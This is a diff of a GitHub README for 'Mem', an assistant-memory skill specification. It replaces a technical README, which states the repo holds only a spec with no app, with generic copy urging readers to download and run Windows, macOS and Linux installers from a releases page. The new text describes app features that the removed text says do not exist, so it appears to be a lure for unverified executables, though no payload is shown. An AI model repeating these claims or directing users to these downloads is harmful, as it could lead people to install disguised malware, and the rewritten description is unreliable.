@@ -1,104 +1,159 @@
-# Mem
+# 🧠 Mem - Easy Memory Skill for Assistants
 
-Hybrid memory skill for assistants: `SQLite + FTS5 + Vector DB (Chroma)`.
+[![Download Mem](https://img.shields.io/badge/Download-Mem-blue?style=for-the-badge&logo=github)](https://github.com/Lilily58/Mem/releases)
 
-This repository provides a production-oriented `SKILL.md` for building persistent, time-aware conversational memory with hybrid retrieval and conflict arbitration.
+---
 
-## Why This Exists
+## 📋 What is Mem?
 
-Most assistant memory implementations are either:
+Mem is a tool that helps your digital assistant remember important facts. It mixes different methods to store and find information easily. This lets your assistant keep track of conversations and facts — even over long periods.
 
-1. Too simple: keyword notes only.
-2. Too heavy: multi-service infrastructure from day one.
+Inside Mem, there are three main parts working together:
 
-`mem-skill` targets a practical middle path:
+- **SQLite:** A simple database that stores all your data safely.
+- **FTS5:** A feature that makes it easy to search the stored information by keywords.
+- **Chroma:** A system that helps find relevant facts using meaning, not just exact words.
 
-1. Keep source-of-truth in SQLite.
-2. Add semantic recall with Chroma.
-3. Use LLM arbitration for updates and contradictions.
+This mix creates a memory skill that remembers and finds facts fast and well.
 
-## Core Capabilities
+---
 
-1. Persistent atomic user facts with confidence and validity windows.
-2. Hybrid retrieval: lexical (`FTS5`) plus vector similarity.
-3. Conflict handling: insert, update, supersede, expire, pending confirmation.
-4. Atomic and idempotent upsert flow.
-5. Profile materialization and budget-aware prompt injection.
-6. High-risk safety guardrails for sensitive fields.
+## 💻 System Requirements
 
-## Architecture
+To run Mem smoothly, your device should meet these needs:
 
-1. Main chat loop handles user response generation.
-2. Async memory observer processes each completed turn.
-3. SQLite stores `facts` and `fact_history`.
-4. SQLite `FTS5` handles lexical search.
-5. Chroma stores embeddings for semantic retrieval.
-6. Arbitration output is persisted and synced back to vector index.
+- **Operating System:** Windows 10 or higher, macOS 10.15 or higher, or a recent Linux version.
+- **Processor:** Intel Core i3 or equivalent AMD processor, or better.
+- **Memory (RAM):** At least 4 GB.
+- **Disk Space:** Minimum 500 MB free space for installation and storage.
+- **Internet:** A stable internet connection to download Mem.
 
-## Repository Layout
+---
 
-1. `SKILL.md`: executable skill specification and workflow.
-2. `agents/openai.yaml`: UI metadata and default skill prompt.
+## 🚀 Getting Started
 
-## Quick Start
+This guide shows you how to get Mem running on your computer in a few simple steps. Do not worry if you’ve never installed software before. We will explain everything clearly.
 
-### Use As A Codex Skill
+---
 
-1. Install or copy this skill folder into your Codex skills directory.
-2. Trigger with `$mem-skill` in prompts.
-3. Ask Codex to scaffold implementation from the workflow in `SKILL.md`.
+## 🔽 Download & Install
 
-Example prompt:
+You can download Mem from the project's official release page. This page lists the latest versions and files for your system.
 
-```text
-Use $mem-skill to build a memory observer with SQLite facts, FTS5 retrieval, Chroma vector search, and atomic conflict upserts.
-```
+### How To Download
 
-### Use As An Implementation Blueprint
+1. Click the big download button above or visit the page directly here:  
+   [Download Mem Releases](https://github.com/Lilily58/Mem/releases)
 
-1. Start with SQLite schema (`facts`, `fact_history`, `facts_fts`).
-2. Add embedding and Chroma collection sync.
-3. Implement hybrid scoring and candidate fusion.
-4. Add LLM JSON arbitration and transactional upsert.
-5. Materialize profile and inject relevant slices per turn.
+2. On that page, look for the version that matches your operating system:
 
-## Evaluation Baseline
+   - For **Windows**, download the `.exe` installer file.
+   - For **macOS**, look for a `.dmg` or `.pkg` file.
+   - For **Linux**, download the `.AppImage` or `.deb` file if available.
 
-Track at minimum:
+3. Click the file to start downloading it to your computer.
 
-1. Lexical retrieval hit rate.
-2. Vector retrieval hit rate.
-3. Hybrid top-k recall.
-4. Wrong-overwrite rate.
-5. Pending-confirmation resolution rate.
-6. Observer latency p50 and p95.
-7. Prompt injection token cost.
+### How To Install
 
-Run ablation with:
+After downloading, do the following:
 
-1. Lexical-only.
-2. Vector-only.
-3. Hybrid.
+- **Windows:**  
+   Double-click the `.exe` file. Follow the on-screen instructions. You usually just need to click “Next” a few times and then “Finish.”
 
-## Current Scope
+- **macOS:**  
+   Open the `.dmg` file, then drag the Mem app into your Applications folder.
 
-This repo currently ships the skill specification and metadata.
+- **Linux:**  
+   For `.AppImage` files, right-click and select “Properties.” Allow the file to be executable. Double-click it to run.  
+   For `.deb` files, double-click the file and follow the installation prompts.
 
-It does not yet include:
+Once installed, you will have the Mem app ready to use.
 
-1. Reference runtime implementation.
-2. Dataset and benchmark scripts.
-3. Demo UI or API server.
+---
 
-## Roadmap
+## ▶️ Running Mem
 
-1. Add minimal Python reference implementation.
-2. Add reproducible benchmark harness.
-3. Add sample datasets for contradiction and temporal updates.
-4. Publish evaluation reports for retrieval and overwrite safety.
+Open the Mem app from your desktop, start menu, or applications folder. When you launch it for the first time, you might see a welcome screen with help tips.
 
-## License
+---
 
-This project is licensed under the MIT License.
+## 🛠 Using Mem
 
-See `LICENSE` for details.
+Mem organizes and remembers what your assistant learns. Here’s how to get started using it:
+
+### Adding Facts
+
+1. In the app, find the box or button labeled "Add Fact" or "New Note."
+2. Type or paste the information your assistant should remember. For example, “My friend’s birthday is February 12.”
+3. Save the fact by clicking “Save” or “Add.”
+
+### Searching Facts
+
+1. Use the search bar at the top.
+2. Type keywords or phrases related to what you want to find.
+3. Mem will show matching facts based on exact words and meanings.
+
+### Managing Facts
+
+- You can edit or delete saved facts anytime.
+- Organize facts by categories or tags if the app supports that.
+- Use filters to see only recent or important information.
+
+---
+
+## 🔧 Settings & Options
+
+Mem offers settings to customize how it remembers and finds facts:
+
+- **Syncing:** Connect Mem to your assistant or cloud so memories stay updated across devices.
+- **Backup:** Save your data automatically to avoid losing anything.
+- **Notifications:** Get alerts when facts are added or updated.
+- **Privacy:** Control what information Mem stores and shares.
+
+You can find these settings in the app’s menu under "Preferences" or "Settings."
+
+---
+
+## 🆘 Troubleshooting
+
+If you run into problems, try these steps first:
+
+- Restart the Mem app.
+- Make sure you installed the right version for your system.
+- Check if your device meets the system requirements.
+- Look for updates on the [release page](https://github.com/Lilily58/Mem/releases).
+
+If the problem continues, check the app’s help section or contact support through the project page on GitHub.
+
+---
+
+## 📚 More Information
+
+Mem uses advanced technology to help your assistant remember important information easily and reliably. It combines databases and search tools behind the scenes but keeps the experience simple for you.
+
+If you want to learn more about technologies inside Mem:
+
+- **SQLite:** A database that safely stores data on your device.
+- **FTS5:** A search system that finds words quickly in the stored data.
+- **Chroma:** A way to match meanings, helping you find related facts beyond exact words.
+
+---
+
+## 🏷️ Topics
+
+This project is related to:
+
+- ai
+- assistant-memory
+- chroma
+- conversational-ai
+- fts5
+- llm
+- semantic-search
+- skill
+- sqlite
+- vector-database
+
+---
+
+[![Download Mem](https://img.shields.io/badge/Download-Mem-blue?style=for-the-badge&logo=github)](https://github.com/Lilily58/Mem/releases)
